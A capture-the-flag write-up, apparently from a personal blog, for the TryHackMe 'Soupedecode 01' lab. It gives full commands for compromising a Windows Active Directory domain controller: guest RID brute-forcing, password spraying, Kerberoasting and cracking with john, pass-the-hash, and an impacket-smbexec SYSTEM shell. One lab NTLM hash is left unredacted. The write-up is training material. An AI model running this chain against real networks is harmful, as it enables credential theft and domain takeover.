---
title: TryHackMe Soupedecode 01
categories: [TryHackMe]
tags: [windows, Active Directory, Kerberoasting, SMB]
media_subpath: /images/tryhackme_soupedecode01
image:
  path: room-image.png
---

[https://tryhackme.com/room/soupedecode01](https://tryhackme/room/soupedecode01)

## Initial Scan

```console
nmap -sS -sC -sV -T4 -p- $ip
Host is up (0.021s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos 
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2025-06-17T21:35:42
|_Not valid after:  2025-12-17T21:35:42
|_ssl-date: 2025-08-02T18:25:00+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-02T18:24:20+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49719/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Enumeration

Add `SOUPEDECODE.LOCAL`   to /etc/hosts 

![etc-hosts](etc-hosts.png)



Let's enumerate smb first.

We can't see any shares without any credentials, but guest is enabled so we could try run `--rid-brute`

![nxc-guest](nxc-guest.png)


To save usernames to other file run this

```console
nxc smb $ip -u 'guest' -p '' --rid-brute | grep 'SidTypeUser' | cut -d '\' -f 2 | cut -d ' ' -f 1 > usernames.txt
```
![valid-users](valid-users.png)


Now time for `crackmapexec`, we'll do password spraying against valid users as ASREProasting gave no results.

It took a while but eventually i found that the password for specific user is same as username

![crackmapexec](crackmapexec.png)



## Initial Entry

We have `Users` share available, log in there using `smbclient`, then navigate to `<USER>/Desktop` and download user.txt

### user.txt

```console
┌──(root㉿kali)-[/home/kali/Documents/Tryhackme/soupedecode01]
└─# cat user.txt
28[REDACTED]a8
```

## Privilege Escalation

Let's check some users for kerbreroasting

```console
impacket-GetUserSPNs -dc-ip $ip 'SOUPEDECODE.LOCAL/[REDACTED]:[REDACTED]' -request -outputfile kerberoastable.txt
```

Run `john` on kerberoastable.txt file

```console
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoastable.txt 
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]    (?) 
```

Log in as `file_svc` user using `smbclient` on `backup` share, download .txt file which contains hashes.

Create 2 separate files: 
 - with users
 - with hashes
 
Then find valid user

```console
nxc smb $ip -u backup_users.txt -H backup_hashes.txt --no-bruteforce --continue-on-success 
SMB         10.10.60.15     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 

... 

SMB         10.10.60.15     445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e4[REDACTED]59 (Pwn3d!)
```

### root.txt

FileServer has administrative privileges, we can use `impacket-smbexec` to run commands

![nxc-fileserver](nxc-fileserver.png)


```console
impacket-smbexec 'SOUPEDECODE.LOCAL/FileServer$@SOUPEDECODE.LOCAL' -hashes :e41da7e79a4c76dbd9cf79d1cb325559

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
27[REDACTED]6a
```
